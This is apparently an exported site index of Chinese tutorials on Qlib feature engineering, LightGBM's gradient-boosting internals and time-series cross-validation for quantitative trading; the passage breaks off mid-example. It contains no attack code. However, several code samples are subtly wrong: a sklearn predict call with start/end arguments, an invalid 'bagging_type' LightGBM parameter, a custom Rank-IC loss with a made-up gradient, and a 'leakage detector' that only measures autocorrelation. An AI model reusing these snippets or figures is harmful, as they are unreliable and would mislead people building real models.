\n    - name: &quot;liquidity_depth&quot;\n      type: &quot;token_level&quot;\n      frequency: &quot;1d&quot;\n \n    # 地址级别\n    - name: &quot;daily_active_addresses&quot;\n      type: &quot;address_level&quot;\n      frequency: &quot;1d&quot;\n \n    - name: &quot;whale_activity&quot;\n      type: &quot;address_level&quot;\n      frequency: &quot;1d&quot;\n \n    # 协议级别\n    - name: &quot;protocol_tvl&quot;\n      type: &quot;protocol_level&quot;\n      frequency: &quot;1d&quot;\n \n# 因子定义\nfactors:\n  - name: &quot;swap_volume_momentum&quot;\n    expr: &quot;Ref($swap_volume, -5) / $swap_volume - 1&quot;\n    category: &quot;momentum&quot;\n \n  - name: &quot;liquidity_depth_ratio&quot;\n    expr: &quot;$liquidity / $market_cap&quot;\n    category: &quot;liquidity&quot;\n \n  - name: &quot;daa_momentum&quot;\n    expr: &quot;Ref($daily_active_addresses, -7) / $daily_active_addresses - 1&quot;\n    category: &quot;on_chain&quot;\n \n  - name: &quot;whale_activity_ratio&quot;\n    expr: &quot;$whale_volume / $total_volume&quot;\n    category: &quot;on_chain&quot;\n \n  - name: &quot;tvl_growth&quot;\n    expr: &quot;Ref($protocol_tvl, -30) / $protocol_tvl - 1&quot;\n    category: &quot;protocol&quot;\n \n# 因子组合\ncombination:\n  on_chain_weight: 0.4\n  off_chain_weight: 0.6\n  method: &quot;ic_weighted&quot;\n \n# 回测配置\nbacktest:\n  start_time: &quot;2022-01-01&quot;\n  end_time: &quot;2023-12-31&quot;\n  rebalance_freq: &quot;1d&quot;  # 链上数据变化快，日频调仓\n  min_liquidity: 100000  # 最小流动性\n  max_gas_price: 50  # 最大Gas价格（Gwei）\n \n# 数据泄漏防护\nleakage_protection:\n  enable: true\n  check_lookahead: true\n  check_future_info: true\n  audit_log: true\n\n总结\n本文从实践角度提供了完整的Qlib特征工程指南，涵盖了从数据优化到链上集成的各个层面。\n核心要点回顾\n\n\n特征张量优化：\n\n内存优化：数据类型、稀疏矩阵、分片加载\n计算优化：向量化、并行化、增量计算\n存储优化：HDF5、Parquet、索引策略\n\n\n\nPipeline配置：\n\n基础模板：行情因子\n进阶模板：多因子组合、中性化\n链上模板：多链、多协议、多维度\n\n\n\n因子质量评估：\n\nIC/IR分析：相关性、稳定性、显著性\n衰减周期测试：不同Horizon的IC表现\n相关性矩阵与去重：层次聚类、IC加权\n\n\n\n数据泄漏防护：\n\n常见泄漏场景：未来数据、样本外信息\n检测方法：相关性检验、分布突变检测\n最佳实践清单：7项关键检查\n\n\n\n链上数据集成：\n\nToken级别：DEX Swap行为因子\n地址级别：活跃地址、大户活动\n协议级别：TVL、APY因子\n交易级别：订单簿、滑点分析\n链上-链下融合：CEX-DEX套利、混合因子\n\n\n\n链上数据集成的核心洞察\n链上数据集成不仅是技术问题，更是思维模式的转变：\n从单维度到多维度：\n\n传统：股票（单维度）\n链上：Token × 地址 × 协议 × 交易（四维度）\n\n从静态到动态：\n\n传统：日频数据（静态）\n链上：7×24小时实时数据（动态）\n\n从单一到融合：\n\n传统：传统金融数据（单一）\n链上：链上 × 链下 × 跨链（融合）\n\n从被动到主动：\n\n传统：被动接受数据\n链上：主动构建数据管道（RPC、The Graph、Dune）\n\n实践建议\n对于传统量化：\n\n关注IC/IR，而不是绝对收益\n横截面标准化和中性化是必须的\n严格防护数据泄漏\n\n对于链上量化：\n\n四维度分析：Token × 地址 × 协议 × 交易\n三个融合方向：链上-链下、多链、链上-链上\n动态数据管道：实时数据流处理\n\n对于项目构建：\n\n模块化设计：配置、因子、评估、工具分离\n日志审计：记录每一步操作\n持续迭代：因子库动态更新\n\n未来展望\n随着Web3和DeFi的快速发展，链上数据量化将成为量化投资的新前沿。Qlib的特征工程框架不仅适用于传统金融，也可以扩展到链上数据分析，为量化投资提供系统化的工具和思维。\n横截面标准化不是数学技巧，而是一种投资策略：\n\n我们不赌国运涨跌，也不赌行业轮动，我们只赌”同一环境下，谁比谁强”。\n\n链上数据集成不是技术问题，而是一种新范式：\n\n我们不局限于传统金融数据，我们融合链上、链下、跨链的多维信息。\n\n\n至此，Qlib特征工程的五个核心文档全部完成。从理论基础到实践指南，从传统金融到链上数据，形成了一个完整的知识体系。\n希望这些文档能够帮助你在量化投资的道路上走得更远、更稳。"},"quant/qlib/week1/index":{"slug":"quant/qlib/week1/index","filePath":"quant/qlib/week1/index.md","title":"index","links":["quant/qlib/week1/01-qlib特征工程全景概览","quant/qlib/week1/02-horizon对齐详解","quant/qlib/week1/03-横截面标准化与中性化","quant/qlib/week1/04-相对强弱预测的量化思维","quant/qlib/week1/05-qlib特征工程实践指南","LightGBM/","/"],"tags":[],"content":"Qlib 特征工程全景概览\nQlib 是微软亚洲研究院开源的量化投资平台，其核心优势在于系统化、标准化的特征工程框架。本文档深入讲解 Qlib 特征工程的核心理念与实践方法。\n\n📖 文档目录\n1️⃣ Qlib特征工程全景概览\n→ 阅读完整文档\n核心内容：\n\n量化特征工程的三大挑战：非平稳性、自相关性、低信噪比\nQlib的诞生背景与设计哲学\n表达式系统与因子计算引擎\n传统ML方法在量化中的失效案例\n\n适合人群：初次接触Qlib的开发者\n\n2️⃣ Horizon对齐详解\n→ 阅读完整文档\n核心内容：\n\nHorizon概念与预测周期的关系\n因子时序特性分析\nForward Fill与Fillna策略\n多Horizon特征构建方法\n\n适合人群：需要理解因子时序特性的开发者\n\n3️⃣ 横截面标准化与中性化\n→ 阅读完整文档\n核心内容：\n\n横截面标准化的方法与意义\n行业中性化与市值中性化\n新股中性化处理\n正交化与因子正交\n\n适合人群：需要进行因子处理的开发者\n\n4️⃣ 相对强弱预测的量化思维\n→ 阅读完整文档\n核心内容：\n\n相对强弱预测的本质\n排序学习的量化应用\nAlpha因子设计思维\n风险调整收益分析\n\n适合人群：理解量化投资本质的研究者\n\n5️⃣ Qlib特征工程实践指南\n→ 阅读完整文档\n核心内容：\n\nQlib完整工作流程\n因子回测与评估\n常见问题与解决方案\n最佳实践与技巧总结\n\n适合人群：准备使用Qlib进行实战的开发者\n\n🎯 核心优势\n🔄 因果性保证\nQlib的表达式系统强制所有计算只能使用历史数据，从根本上杜绝了未来信息泄露。\n📊 时序效率\n优化的Rolling操作和增量计算，大幅提升大规模时序数据的处理效率。\n🧩 模块化设计\n原子算子、复合算子、自定义算子的三级架构，灵活构建复杂因子。\n🚀 可复现性\n标准化的因子定义和计算流程，确保研究结果的可靠性和可复现性。\n\n🎓 学习建议\n🟢 入门阶段\n建议按顺序阅读：\n\nQlib特征工程全景概览\nHorizon对齐详解\n横截面标准化与中性化\n\n🟡 进阶阶段\n深入理解：\n\n相对强弱预测的量化思维\nQlib特征工程实践指南\n\n🔴 实战阶段\n结合具体项目，在实践中深入理解各个概念。\n\n💡 实用技巧\n\n从简单开始：先用基本算子构建简单因子，理解核心概念\n关注因果性：时刻注意避免未来信息泄露\n善用可视化：观察因子分布和相关性，快速发现问题\n逐步迭代：从原型到生产，逐步优化因子质量\n\n\n🔗 相关资源\n\nQlib官方文档\nQlib GitHub仓库\nLightGBM文档\n\n\n← 返回首页"},"quant/qlib/week2/01-Gradient-Boosting原理":{"slug":"quant/qlib/week2/01-Gradient-Boosting原理","filePath":"quant/qlib/week2/01-Gradient-Boosting原理.md","title":"01-Gradient-Boosting原理","links":[],"tags":[],"content":"Gradient Boosting 原理\n1. Boosting算法基础\n1.1 集成学习的核心思想\nBoosting是一种强大的集成学习方法，其核心思想是将多个弱学习器（weak learners）组合成一个强学习器（strong learner）。与Bagging（随机森林）不同，Boosting采用串行训练方式，每个新模型都专注于纠正前一个模型的错误。\n数学表达\n给定训练数据 D = \\{(x_i, y_i)\\}_{i=1}^N，Boosting通过以下方式构建模型：\nF(x) = \\sum_{m=1}^M \\alpha_m h_m(x)\n其中：\n\nh_m(x) 是第 m 个弱学习器\n\\alpha_m 是第 m 个学习器的权重\nM 是学习器总数\n\n关键特性\n\n串行训练：每个模型按顺序训练，依赖前一个模型\n错误聚焦：新模型重点关注前序模型预测错误的样本\n权重更新：样本权重或模型权重动态调整\n逐步优化：整体模型性能逐步提升\n\n1.2 Gradient Boosting的数学推导\n目标函数\nGradient Boosting将Boosting问题转化为优化问题，最小化损失函数：\n\\min_{F} L(y, F(x))\n其中 L 是损失函数，F(x) 是最终的集成模型。\n前向分步算法\n前向分步算法（Forward Stagewise Additive Modeling）是Gradient Boosting的核心：\n\n初始化：从常数值开始\n\nF_0(x) = \\arg\\min_{\\gamma} \\sum_{i=1}^N L(y_i, \\gamma)\n\n迭代优化：对于 m = 1 到 M：\n\na. 计算负梯度（伪残差）\nr_{im} = -\\left[\\frac{\\partial L(y_i, F(x_i))}{\\partial F(x_i)}\\right]_{F(x) = F_{m-1}(x)}\nb. 用基学习器拟合负梯度\nh_m(x) = \\arg\\min_{h} \\sum_{i=1}^N (r_{im} - h(x_i))^2\nc. 计算最优步长\n\\gamma_m = \\arg\\min_{\\gamma} \\sum_{i=1}^N L(y_i, F_{m-1}(x_i) + \\gamma h_m(x_i))\nd. 更新模型\nF_m(x) = F_{m-1}(x) + \\gamma_m h_m(x)\n为什么使用负梯度？\n泰勒展开给出了直观解释。在 F_{m-1}(x) 处对损失函数进行一阶展开：\nL(y, F_{m-1}(x) + \\Delta F(x)) \\approx L(y, F_{m-1}(x)) + \\left[\\frac{\\partial L(y, F_{m-1}(x))}{\\partial F_{m-1}(x)}\\right] \\Delta F(x)\n为了减少损失，我们需要：\n\\Delta F(x) = -\\left[\\frac{\\partial L(y, F_{m-1}(x))}{\\partial F_{m-1}(x)}\\right]\n这正是梯度下降的方向，因此称为Gradient Boosting。\n1.3 不同损失函数的负梯度\n回归任务\n对于平方损失 L(y, F) = \\frac{1}{2}(y - F)^2：\n\\frac{\\partial L}{\\partial F} = -(y - F)\n负梯度：\nr_{im} = y_i - F_{m-1}(x_i)\n即残差（residual），直观解释为预测误差。\n分类任务\n对于对数损失（Log Loss）：\nL(y, F) = \\log(1 + \\exp(-yF))\n其中 y \\in \\{-1, 1\\}。\n负梯度：\nr_{im} = \\frac{y_i}{1 + \\exp(y_i F_{m-1}(x_i))}\n2. LightGBM的核心创新\n2.1 GOSS（基于梯度的单边采样）\n传统采样的局限\n传统GBDT使用随机采样或无采样，存在两个问题：\n\n随机采样：部分重要样本可能被丢弃\n无采样：计算量大，训练速度慢\n\nGOSS的核心思想\nGOSS（Gradient-based One-Side Sampling）根据样本的梯度大小进行采样：\n\n保留大梯度样本：保留梯度绝对值最大的 a \\times N 个样本\n随机采样小梯度样本：从剩余样本中随机采样 b \\times N 个样本\n补偿小梯度：对随机采样的小梯度样本乘以权重 \\frac{1 - a}{b}\n\n算法流程\n# 伪代码\ndef goss_sampling(gradients, a=0.2, b=0.1):\n    N = len(gradients)\n \n    # 1. 选取大梯度样本\n    top_indices = argsort(abs(gradients))[-int(a * N):]\n \n    # 2. 随机采样小梯度样本\n    remaining_indices = set(range(N)) - set(top_indices)\n    random_indices = random.sample(remaining_indices, int(b * N))\n \n    # 3. 设置采样权重\n    sample_weights = np.ones(N)\n    sample_weights[random_indices] = (1 - a) / b\n \n    return top_indices + random_indices, sample_weights\n理论保证\nGOSS通过以下方式保证信息不丢失：\n\n大梯度样本对模型学习贡献大，全部保留\n小梯度样本通过随机采样保留部分信息\n权重补偿确保小梯度样本的统计贡献\n\n在量化中的应用\n对于量化场景，GOSS特别适合处理不平衡的股票样本：\n\n预测误差大的股票（大梯度）会被重点学习\n预测误差小的股票（小梯度）适当采样\n整体训练效率提升3-5倍\n\n2.2 EFB（互斥特征捆绑）\n特征稀疏性问题\n量化数据中，特征矩阵通常高度稀疏。例如：\n\n技术指标在不同股票间可能缺失\n行业因子在特定股票上为0\n时间序列存在自然稀疏性\n\nEFB的核心思想\nEFB（Exclusive Feature Bundling）利用特征的互斥性（Exclusive Feature）进行特征捆绑：\n\n识别互斥特征对：两个特征几乎不同时为非零值\n构建特征簇：将互斥特征聚合成簇\n特征合并：将簇内特征合并为单一特征\n\n互斥性定义\n特征 A 和 B 的互斥程度：\n\\text{Exclusivity}(A, B) = \\frac{|\\{i: A_i \\neq 0 \\text{ and } B_i \\neq 0\\}|}{|\\{i: A_i \\neq 0 \\text{ or } B_i \\neq 0\\}|}\n如果 \\text{Exclusivity}(A, B) &lt; \\epsilon，则认为 A 和 B 互斥。\n特征捆绑算法\n\n构建冲突图：节点代表特征，边代表非互斥关系\n图着色：对冲突图进行着色，相同颜色的特征可以捆绑\n特征合并：将同色特征合并，通过偏移量区分\n\n特征合并方式\n假设捆绑特征 A 和 B：\n\\text{BundledFeature} = A + \\text{offset}_B \\cdot B\n其中 \\text{offset}_B 选择为 A 的最大值 + 1。\n在量化中的应用\n对于量化因子，EFB可以：\n\n将行业分类特征捆绑\n合并稀疏的技术指标\n降低特征维度，加速训练\n\n2.3 Leaf-wise生长策略\nLevel-wise vs Leaf-wise\n传统GBDT（如XGBoost）使用Level-wise生长策略，而LightGBM使用Leaf-wise：\nLevel-wise策略\n\n每一层分裂所有叶子节点\n树生长平衡，但可能分裂无效节点\n计算资源浪费在低增益分裂上\n\nLeaf-wise策略\n\n每次选择增益最大的叶子节点进行分裂\n树生长不平衡，但更高效\n专注于最大化每步的信息增益\n\nLeaf-wise的优势\n对于相同深度的树：\n\nLeaf-wise能更快降低损失\n在量化场景中，能更快捕捉关键特征\n\n潜在问题与解决方案\nLeaf-wise可能导致过拟合，LightGBM通过以下方式控制：\n\n最大深度限制：max_depth 参数\n叶子节点数限制：num_leaves 参数\n最小增益阈值：min_split_gain 参数\n\n在量化中的应用\n对于量化场景，Leaf-wise特别适合：\n\n捕捉非线性的因子交互效应\n快速发现有效的因子组合\n在有限的迭代次数内达到最优性能\n\n3. LightGBM在量化中的优势\n3.1 处理大规模因子数据\n量化数据特点\n\n高维特征：数百到数千个因子\n时间维度：多个时间点的历史数据\n截面维度：数千只股票\n稀疏性：部分因子在部分股票上缺失\n\nLightGBM的优势\n\n\n内存效率\n\n使用binning技术，特征压缩到256 bins\n内存占用比传统GBDT减少60-80%\n\n\n\n计算速度\n\nGOSS采样减少样本数量\nEFB减少特征数量\nLeaf-wise快速收敛\n\n\n\n分布式训练\n\n支持多机多卡并行训练\n适合处理超大规模因子库\n\n\n\n3.2 处理非平衡样本\n量化样本不平衡问题\n\n牛市/熊市样本不均衡\n涨/跌样本比例波动\n不同股票的样本量差异大\n\nLightGBM的解决方案\n\n\nGOSS自适应采样\n\n自动关注难预测样本\n不需要手动设置样本权重\n\n\n\n加权损失\n\nscale_pos_weight 参数控制正负样本权重\n支持自定义样本权重\n\n\n\n类别平衡\n\nis_unbalance 参数自动处理类别不平衡\n\n\n\n3.3 支持自定义损失函数\n量化评估指标的特殊性\n量化投资关注IC、IR等非标准评估指标，需要自定义损失函数。\nLightGBM的自定义损失\nimport numpy as np\nimport lightgbm as lgb\n \ndef rank_ic_loss(preds, train_data):\n    labels = train_data.get_label()\n \n    # 计算Rank IC\n    rank_pred = np.argsort(preds)\n    rank_label = np.argsort(labels)\n    ic = np.corrcoef(rank_pred, rank_label)[0, 1]\n \n    # 返回梯度和Hessian\n    grad = -ic * (labels - preds)\n    hess = np.ones_like(preds)\n \n    return grad, hess\n \n# 使用自定义损失\ntrain_data = lgb.Dataset(X_train, label=y_train)\nparams = {\n    &#039;objective&#039;: &#039;custom&#039;,\n    &#039;metric&#039;: &#039;custom&#039;\n}\n \nmodel = lgb.train(\n    params,\n    train_data,\n    num_boost_round=1000,\n    fobj=rank_ic_loss\n)\n3.4 正则化防止过拟合\n量化过拟合风险\n\n因子数量多，样本相对少\n历史数据存在过拟合风险\n样本外表现可能下降\n\nLightGBM的正则化机制\n\n\nL1/L2正则化\n\nlambda_l1: L1正则化系数\nlambda_l2: L2正则化系数\n\n\n\n早停机制\n\nearly_stopping_rounds: 监控验证集，提前停止\n\n\n\n参数约束\n\nmin_data_in_leaf: 叶子节点最小样本数\nmax_depth: 树最大深度\nnum_leaves: 叶子节点最大数量\n\n\n\n4. LightGBM核心参数详解\n4.1 训练参数\n核心迭代参数\nparams = {\n    # 核心参数\n    &#039;num_leaves&#039;: 31,              # 叶子节点数量，影响模型复杂度\n    &#039;max_depth&#039;: -1,               # 树最大深度，-1表示无限制\n    &#039;learning_rate&#039;: 0.05,         # 学习率，控制模型收敛速度\n \n    # 采样参数\n    &#039;bagging_fraction&#039;: 0.8,       # 每次迭代使用的样本比例\n    &#039;feature_fraction&#039;: 0.8,       # 每次迭代使用的特征比例\n    &#039;bagging_freq&#039;: 5,             # bagging频率，0表示禁用\n \n    # 正则化参数\n    &#039;lambda_l1&#039;: 0.0,              # L1正则化\n    &#039;lambda_l2&#039;: 0.0,              # L2正则化\n    &#039;min_data_in_leaf&#039;: 20,        # 叶子节点最小样本数\n    &#039;min_sum_hessian_in_leaf&#039;: 1e-3,  # 叶子节点最小Hessian和\n \n    # GOSS参数\n    &#039;bagging_type&#039;: &#039;goss&#039;,        # 使用GOSS采样\n \n    # 其他参数\n    &#039;objective&#039;: &#039;regression&#039;,     # 目标函数\n    &#039;metric&#039;: &#039;rmse&#039;,              # 评估指标\n}\n4.2 重要参数调优策略\n快速调优流程\n\n第一步：设置num_leaves\n\n# num_leaves = 2^max_depth 的经验值\nmax_depth = 6\nnum_leaves = 2 ** 6  # 64\n \n# 实际可以略小于这个值，例如：\nnum_leaves = int(0.8 * 2 ** max_depth)\n\n第二步：调整learning_rate和n_estimators\n\n# 学习率越小，需要的迭代次数越多\nlearning_rate = 0.05\nn_estimators = 1000\n \n# 早停机制\nearly_stopping_rounds = 50\n\n第三步：调整bagging和feature fraction\n\n# 防止过拟合\nbagging_fraction = 0.8\nfeature_fraction = 0.8\nbagging_freq = 5\n\n第四步：调整正则化\n\n# 观察验证集表现\nlambda_l1 = 0.1\nlambda_l2 = 0.1\nmin_data_in_leaf = 20\n量化场景推荐配置\nquant_params = {\n    # 高维特征场景\n    &#039;num_leaves&#039;: 127,\n    &#039;max_depth&#039;: 8,\n    &#039;learning_rate&#039;: 0.03,\n \n    # 正则化\n    &#039;lambda_l1&#039;: 0.1,\n    &#039;lambda_l2&#039;: 0.1,\n    &#039;min_data_in_leaf&#039;: 100,  # 较大值防止过拟合\n \n    # 采样\n    &#039;bagging_fraction&#039;: 0.7,\n    &#039;feature_fraction&#039;: 0.7,\n    &#039;bagging_freq&#039;: 5,\n \n    # 早停\n    &#039;early_stopping_rounds&#039;: 100,\n}\n5. Bagging vs Boosting 对比\n5.1 核心区别\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n维度Bagging (随机森林)Boosting (GBDT)树的关系并行、独立串行、依赖前一棵采样方式有放回随机采样全部数据权重等权重平均学习率加权累加偏差-方差降低方差降低偏差过拟合不容易需要早停控制代表算法Random ForestXGBoost, LightGBM\n5.2 可视化对比\nimport matplotlib.pyplot as plt\nimport numpy as np\n \n# 模拟训练过程\nboosting_train_loss = [1.0, 0.8, 0.6, 0.5, 0.45, 0.42, 0.40, 0.39, 0.38, 0.38]\nboosting_val_loss = [1.0, 0.85, 0.72, 0.65, 0.62, 0.61, 0.62, 0.64, 0.66, 0.68]\n \nbagging_train_loss = [0.6, 0.58, 0.57, 0.56, 0.56, 0.56, 0.56, 0.56, 0.56, 0.56]\nbagging_val_loss = [0.65, 0.63, 0.62, 0.61, 0.61, 0.61, 0.61, 0.61, 0.61, 0.61]\n \n# 绘图\nfig, axes = plt.subplots(1, 2, figsize=(14, 5))\n \n# Boosting\naxes[0].plot(boosting_train_loss, &#039;b-&#039;, label=&#039;Train Loss&#039;, linewidth=2)\naxes[0].plot(boosting_val_loss, &#039;r-&#039;, label=&#039;Val Loss&#039;, linewidth=2)\naxes[0].axhline(y=0.62, color=&#039;g&#039;, linestyle=&#039;--&#039;, label=&#039;Overfitting Point&#039;)\naxes[0].set_xlabel(&#039;Iterations&#039;)\naxes[0].set_ylabel(&#039;Loss&#039;)\naxes[0].set_title(&#039;Boosting: 逐步纠错，易过拟合&#039;)\naxes[0].legend()\naxes[0].grid(True, alpha=0.3)\n \n# Bagging\naxes[1].plot(bagging_train_loss, &#039;b-&#039;, label=&#039;Train Loss&#039;, linewidth=2)\naxes[1].plot(bagging_val_loss, &#039;r-&#039;, label=&#039;Val Loss&#039;, linewidth=2)\naxes[1].set_xlabel(&#039;Iterations&#039;)\naxes[1].set_ylabel(&#039;Loss&#039;)\naxes[1].set_title(&#039;Bagging: 并行训练，难过拟合&#039;)\naxes[1].legend()\naxes[1].grid(True, alpha=0.3)\n \nplt.tight_layout()\nplt.show()\n5.3 为什么量化偏爱 Boosting？\n量化场景特点：\n\n\n信号很弱 📊\n\n股票预测的 IC 通常只有 0.03~0.08\n需要模型精确捕捉微弱模式\n→ Boosting 擅长降低偏差，提取弱信号\n\n\n\n特征稀疏 🔍\n\n不是所有特征都有用\n需要自动选择重要特征\n→ LightGBM 的 feature_fraction 参数\n\n\n\n需要快速迭代 ⚡\n\n每天都有新数据\n需要快速重训练\n→ LightGBM 比 XGBoost 快 10x\n\n\n\n6. Boosting 的迭代纠错机制可视化\n6.1 残差学习过程\ndef visualize_residual_learning():\n    &quot;&quot;&quot;可视化残差学习过程&quot;&quot;&quot;\n    \n    # 生成模拟数据\n    np.random.seed(42)\n    X = np.linspace(0, 10, 100)\n    y = np.sin(X) + np.random.normal(0, 0.2, 100)\n    \n    # 使用 sklearn 的 GradientBoostingRegressor\n    from sklearn.ensemble import GradientBoostingRegressor\n    \n    # 逐步训练\n    n_trees = 5\n    gbr = GradientBoostingRegressor(n_estimators=n_trees, max_depth=2, \n                                    learning_rate=0.5, random_state=42)\n    gbr.fit(X.reshape(-1, 1), y)\n    \n    # 绘图\n    fig, axes = plt.subplots(2, n_trees, figsize=(15, 8))\n    \n    for i in range(n_trees):\n        # 获取第i棵树的预测\n        pred_i = gbr.predict(X.reshape(-1, 1), start=i, end=i+1)\n        \n        # 获取第i步的累计预测\n        pred_cumulative = gbr.predict(X.reshape(-1, 1), start=0, end=i+1)\n        \n        # 计算残差\n        if i == 0:\n            residual = y - np.mean(y)\n        else:\n            residual = y - gbr.predict(X.reshape(-1, 1), start=0, end=i)\n        \n        # 第i棵树的预测\n        axes[0, i].scatter(X, y, alpha=0.3, color=&#039;gray&#039;)\n        axes[0, i].plot(X, pred_i, &#039;r-&#039;, linewidth=2)\n        axes[0, i].set_title(f&#039;Tree {i+1}: Learning Residual&#039;)\n        axes[0, i].grid(True, alpha=0.3)\n        \n        # 累计预测\n        axes[1, i].scatter(X, y, alpha=0.3, color=&#039;gray&#039;)\n        axes[1, i].plot(X, pred_cumulative, &#039;b-&#039;, linewidth=2)\n        axes[1, i].set_title(f&#039;Cumulative: Trees 1-{i+1}&#039;)\n        axes[1, i].grid(True, alpha=0.3)\n    \n    plt.tight_layout()\n    plt.show()\n \n# 使用示例\nvisualize_residual_learning()\n6.2 迭代过程示意\n迭代过程:\nTree₁ → 预测 ŷ₁ → 残差 r₁ = y - ŷ₁\nTree₂ → 学习 r₁ → 预测 ŷ₂ → 残差 r₂ = r₁ - ŷ₂\nTree₃ → 学习 r₂ → 预测 ŷ₃ → 残差 r₃ = r₂ - ŷ₃\n...\n最终预测 = ŷ₁ + ŷ₂ + ŷ₃ + ...\n\n7. 总结\nGradient Boosting通过前向分步算法和梯度下降思想，将多个弱学习器组合成强学习器。LightGBM在传统GBDT基础上，通过GOSS、EFB和Leaf-wise三大创新，大幅提升了训练效率和性能。\n在量化投资中，LightGBM的优势体现在：\n\n处理大规模因子数据的高效性\n自适应处理不平衡样本\n支持自定义量化评估指标\n强大的正则化防止过拟合\n捕捉微弱预测信号的能力\n快速迭代适应市场变化\n\n理解LightGBM的原理，是构建有效量化模型的基础。"},"quant/qlib/week2/02-时序数据划分":{"slug":"quant/qlib/week2/02-时序数据划分","filePath":"quant/qlib/week2/02-时序数据划分.md","title":"02-时序数据划分","links":[],"tags":[],"content":"时序数据划分\n1. 量化时序数据的特殊性\n1.1 因果性约束\n核心问题\n在量化投资中，数据划分必须严格遵守因果性（Causality）原则：只能使用历史数据预测未来，绝不能使用未来信息。\n数学表达\n对于时间点 t 的预测 \\hat{y}_t：\n\\hat{y}_t = f(X_{\\leq t})\n其中 X_{\\leq t} 表示 t 时刻及之前的所有特征，不允许包含 X_{&gt;t}。\n违反因果性的典型错误\n# 错误示例1：全局标准化\nfrom sklearn.preprocessing import StandardScaler\n \nscaler = StandardScaler()\nX_scaled = scaler.fit_transform(X)  # 使用全部数据计算均值和方差\n \n# 这导致 t 时刻的特征使用了 t+1, t+2, ... 的统计信息\n# 问题：scaler.fit使用全部数据的mean和std\n# 错误示例2：PCA降维\nfrom sklearn.decomposition import PCA\n \npca = PCA(n_components=5)\nX_pca = pca.fit_transform(X)  # 使用全部数据计算主成分\n \n# 问题：PCA的协方差矩阵基于全部数据\n正确做法\n# 正确示例1：滚动标准化\nfrom sklearn.preprocessing import StandardScaler\n \ndef rolling_standardize(X, window=252):\n    X_scaled = np.zeros_like(X)\n    for i in range(window, len(X)):\n        scaler = StandardScaler()\n        X_scaled[i] = scaler.fit_transform(X[i-window:i])[-1]\n    return X_scaled\n1.2 数据泄露的检测方法\n前向泄露\n特征计算中使用了未来数据：\nX_t = f(X_{t+1}, X_{t+2}, \\dots)\n检测方法\ndef detect_lookahead_leakage(X, window=5):\n    &quot;&quot;&quot;\n    检测特征是否使用了未来信息\n \n    方法：检查特征与未来目标的相关性\n    &quot;&quot;&quot;\n    correlations = []\n    for lag in range(1, window + 1):\n        # 计算当前特征与未来lag期目标的相关性\n        corr = np.corrcoef(X[:-lag], X[lag:])[0, 1]\n        correlations.append(corr)\n \n    # 如果相关性强，可能存在未来信息泄露\n    if max(correlations) &gt; 0.1:\n        print(f&quot;警告：检测到潜在的未来信息泄露，最大相关性: {max(correlations):.4f}&quot;)\n \n    return correlations\n横截面泄露\n使用了同截面其他股票的信息：\nX_{i,t} = f(X_{j,t}) \\quad \\text{where } j \\neq i\n检测方法\ndef detect_cross_section_leakage(X, stock_ids, n_stocks=100):\n    &quot;&quot;&quot;\n    检测是否存在横截面信息泄露\n \n    方法：检查股票间特征的瞬时相关性\n    &quot;&quot;&quot;\n    t_corr = []\n    for t in range(X.shape[1]):\n        # 计算t时刻所有股票间的相关性\n        Xt = X[:, t, :]\n        corr_matrix = np.corrcoef(Xt)\n \n        # 平均相关性\n        avg_corr = (np.sum(np.abs(corr_matrix)) - n_stocks) / (n_stocks * (n_stocks - 1))\n        t_corr.append(avg_corr)\n \n    return t_corr\n2. 时间序列交叉验证方法\n2.1 传统K-Fold的局限性\n为什么不能用随机K-Fold？\n# 错误示例：使用随机K-Fold\nfrom sklearn.model_selection import KFold\n \nkf = KFold(n_splits=5, shuffle=True)\nfor train_idx, val_idx in kf.split(X):\n    # 问题：训练集和验证集在时间上交错\n    # 例如：train包含2023年数据，val包含2022年数据\n    X_train, X_val = X[train_idx], X[val_idx]\n问题分析\n\n未来信息泄露：验证集可能包含训练集之前的数据\n回测失真：不符合实际投资场景\n评估偏差：虚高模型性能\n\n示例说明\n时间轴：2018 | 2019 | 2020 | 2021 | 2022 | 2023\n随机K-Fold可能产生：\nTrain: 2018, 2020, 2023\nVal:   2019, 2021, 2022\n\n这在实际中不可能！\n\n2.2 时间序列交叉验证（TimeSeriesSplit）\n基本原理\nfrom sklearn.model_selection import TimeSeriesSplit\n \ntscv = TimeSeriesSplit(n_splits=5)\n \nfor train_idx, val_idx in tscv.split(X):\n    # 训练集：[t_start, t_train_end]\n    # 验证集：[t_train_end+1, t_val_end]\n    X_train, X_val = X[train_idx], X[val_idx]\n可视化示意\nFold 1: |=== Train ===|== Val ==|.........|\nFold 2: |==== Train ====|=== Val ===|.....|\nFold 3: |===== Train =====|==== Val ====|..|\nFold 4: |====== Train ======|===== Val =====|\nFold 5: |======= Train =======|====== Val ==|\n\n代码实现\nimport numpy as np\nimport pandas as pd\nfrom sklearn.model_selection import TimeSeriesSplit\nimport lightgbm as lgb\n \ndef time_series_cv(X, y, params, n_splits=5):\n    &quot;&quot;&quot;\n    时间序列交叉验证\n \n    参数:\n        X: 特征矩阵，shape=[n_samples, n_features]\n        y: 目标变量，shape=[n_samples]\n        params: LightGBM参数\n        n_splits: 折数\n \n    返回:\n        val_scores: 每折的验证集得分\n    &quot;&quot;&quot;\n    tscv = TimeSeriesSplit(n_splits=n_splits)\n    val_scores = []\n \n    for fold, (train_idx, val_idx) in enumerate(tscv.split(X)):\n        print(f&quot;Fold {fold + 1}/{n_splits}&quot;)\n        print(f&quot;  Train: {train_idx[0]} - {train_idx[-1]}&quot;)\n        print(f&quot;  Val:   {val_idx[0]} - {val_idx[-1]}&quot;)\n \n        # 划分数据\n        X_train, X_val = X[train_idx], X[val_idx]\n        y_train, y_val = y[train_idx], y[val_idx]\n \n        # 创建数据集\n        train_data = lgb.Dataset(X_train, label=y_train)\n        val_data = lgb.Dataset(X_val, label=y_val, reference=train_data)\n \n        # 训练模型\n        model = lgb.train(\n            params,\n            train_data,\n            num_boost_round=1000,\n            valid_sets=[train_data, val_data],\n            callbacks=[\n                lgb.early_stopping(stopping_rounds=50, verbose=False),\n                lgb.log_evaluation(period=100)\n            ]\n        )\n \n        # 评估\n        y_pred = model.predict(X_val)\n        score = np.corrcoef(y_pred, y_val)[0, 1]\n        val_scores.append(score)\n        print(f&quot;  Validation IC: {score:.4f}&quot;)\n \n    return val_scores\n2.3 滚动窗口交叉验证（Rolling Window）\n适用场景\n当数据分布随时间剧烈变化时，使用固定窗口大小滚动训练。\n方法对比\n扩展窗口（Expanding Window）：\nFold 1: |=== Train ===|== Val ==|.........|\nFold 2: |==== Train ====|=== Val 